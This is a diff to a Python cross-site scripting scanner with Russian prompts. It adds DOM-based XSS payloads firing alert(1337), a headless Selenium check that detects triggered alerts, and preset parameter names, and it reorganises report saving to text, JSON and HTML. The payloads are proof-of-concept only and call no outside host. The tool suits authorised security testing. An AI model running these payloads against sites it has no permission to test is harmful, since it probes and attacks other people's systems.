@@ -3,10 +3,20 @@ import urllib.parse
 import requests
 import html
 import json
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options
 
 resultjson = []
 
 result = f"xss_result_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"
+
+dom_payload = [
+    "#<img src=x onerror=alert(1337)>",
+    "#<svg onload=alert(1337)>",
+    "#<body onload=alert(1337)>",
+    "?q=<script>alert(1337)</script>",
+    "#<iframe src='javascript:alert(1337)'>"
+]
 
 payloads = [
     "<script>alert('XSS')</script>",
@@ -49,6 +59,39 @@ def vibor():
     choice = input(": ").strip()
     return choice
 
+def test_dom_xss(base_url, dom_payloads, resultjson):
+    print("\nПроверка на DOM-based XSS (Selenium):")
+    options = Options()
+    options.add_argument("--headless")
+    driver = webdriver.Firefox(options=options)
+
+    for payload in dom_payloads:
+        try:
+            full_url = base_url + payload
+            driver.get(full_url)
+            alert = False
+            try:
+                alert_obj = driver.switch_to.alert
+                alert_obj.accept()
+                alert = True
+            except:
+                pass
+
+            print(f"{'сработал' if alert else 'не сработал'} {payload}")
+
+            result_entry = {
+                "payload": payload,
+                "worked": alert,
+                "url": full_url,
+                "status_code": "N/A (DOM)"
+            }
+            resultjson.append(result_entry)
+
+        except Exception as e:
+            print(f"ошибка DOM XSS: {e}")
+
+    driver.quit()
+
 save_format = vibor()
 
 method = input("Выбери метод запроса (GET или POST): ").strip().upper()
@@ -61,9 +104,27 @@ headers = {
 }
 
 url = input("Введите url (например, https://example.com): ").strip()
-param = input("Выбери имя параметра(например, q): ").strip()
+def get_param():
+    print("\n1 - Ввести имя параметра вручную")
+    print("2 - Выбрать из популярных имён параметров")
+    choice = input("Выбор: ").strip()
 
-print("\nПроверка на xss")
+    if choice == "2":
+        preset_params = ["q", "search", "query", "s", "input"]
+        for i, p in enumerate(preset_params, 1):
+            print(f"{i}: {p}")
+        try:
+            idx = int(input("Выбери номер: ").strip())
+            return preset_params[idx - 1]
+        except (ValueError, IndexError):
+            print("Неверный выбор, будет 'q' по умолчанию.")
+            return "q"
+    else:
+        return input("Введите имя параметра (например, q): ").strip()
+
+param = get_param()
+
+print("\nПроверка на XSS")
 
 for payload in payloads:
     try:
@@ -74,6 +135,7 @@ for payload in payloads:
             encoded_payload = urllib.parse.quote(payload)
             test_url = f"{url}?{param}={encoded_payload}"
             response = requests.get(test_url, headers=headers)
+
         worked = payload in response.text
         print(f"{'сработал' if worked else 'не сработал'} {payload}")
 
@@ -85,61 +147,64 @@ for payload in payloads:
         }
         resultjson.append(result_entry)
 
-        if save_format == "1":
-            with open(f"{result}.txt", "a", encoding="utf-8") as f:
-                f.write(f"{'сработал' if worked else 'не сработал'} {payload}\n")
-
-        elif save_format == "2":
-            with open(f"{result}.json", "w", encoding="utf-8") as jf:
-                json.dump(resultjson, jf, ensure_ascii=False, indent=4)
-
-        elif save_format == "3":
-            html_content = """
-                <!DOCTYPE html>
-                <html lang="ru">
-                <head>
-                    <meta charset="UTF-8">
-                    <title>Результаты XSS</title>
-                    <style>
-                        body { font-family: sans-serif; background: #f9f9f9; padding: 20px; }
-                        table { border-collapse: collapse; width: 100%; background: white; }
-                        th, td { border: 1px solid #ddd; padding: 8px; }
-                        th { background: #222; color: white; }
-                        tr:nth-child(even) { background: #f2f2f2; }
-                        code { color: #c7254e; background: #f9f2f4; padding: 2px 4px; border-radius: 4px; }
-                    </style>
-                </head>
-                <body>
-                    <h1>Результаты XSS</h1>
-                    <table>
-                        <tr>
-                            <th>Payload</th>
-                            <th>URL</th>
-                            <th>Сработал?</th>
-                            <th>Status Code</th>
-                        </tr>
-                """
-
-            for entry in resultjson:
-                safe_payload = html.escape(entry["payload"])
-                safe_url = html.escape(entry["url"])
-                html_content += f"""
-                        <tr>
-                            <td><code>{safe_payload}</code></td>
-                            <td><a href="{safe_url}">{safe_url}</a></td>
-                            <td>{"Да" if entry["worked"] else "Нет"}</td>
-                            <td>{entry["status_code"]}</td>
-                        </tr>
-                    """
-
-            html_content += """
-                    </table>
-                </body>
-                </html>
-                """
-
-            with open(f"{result}.html", "w", encoding="utf-8") as hf:
-                hf.write(html_content)
-
     except Exception as e:
         print(f"ошибка {e}")
+
+test_dom_xss(url, dom_payload, resultjson)
+
+if save_format == "1":
+    with open(f"{result}.txt", "w", encoding="utf-8") as f:
+        for entry in resultjson:
+            f.write(f"{'сработал' if entry['worked'] else 'не сработал'} {entry['payload']}\n")
+
+elif save_format == "2":
+    with open(f"{result}.json", "w", encoding="utf-8") as jf:
+        json.dump(resultjson, jf, ensure_ascii=False, indent=4)
+
+elif save_format == "3":
+    html_content = """
+        <!DOCTYPE html>
+        <html lang="ru">
+        <head>
+            <meta charset="UTF-8">
+            <title>Результаты XSS</title>
+            <style>
+                body { font-family: sans-serif; background: #f9f9f9; padding: 20px; }
+                table { border-collapse: collapse; width: 100%; background: white; }
+                th, td { border: 1px solid #ddd; padding: 8px; }
+                th { background: #222; color: white; }
+                tr:nth-child(even) { background: #f2f2f2; }
+                code { color: #c7254e; background: #f9f2f4; padding: 2px 4px; border-radius: 4px; }
+            </style>
+        </head>
+        <body>
+            <h1>Результаты XSS</h1>
+            <table>
+                <tr>
+                    <th>Payload</th>
+                    <th>URL</th>
+                    <th>Сработал?</th>
+                    <th>Status Code</th>
+                </tr>
+    """
+
+    for entry in resultjson:
+        safe_payload = html.escape(entry["payload"])
+        safe_url = html.escape(entry["url"])
+        html_content += f"""
+                <tr>
+                    <td><code>{safe_payload}</code></td>
+                    <td><a href="{safe_url}">{safe_url}</a></td>
+                    <td>{"Да" if entry["worked"] else "Нет"}</td>
+                    <td>{entry["status_code"]}</td>
+                </tr>
+        """
+
+    html_content += """
+            </table>
+        </body>
+        </html>
+    """
+
+    with open(f"{result}.html", "w", encoding="utf-8") as hf:
+        hf.write(html_content)
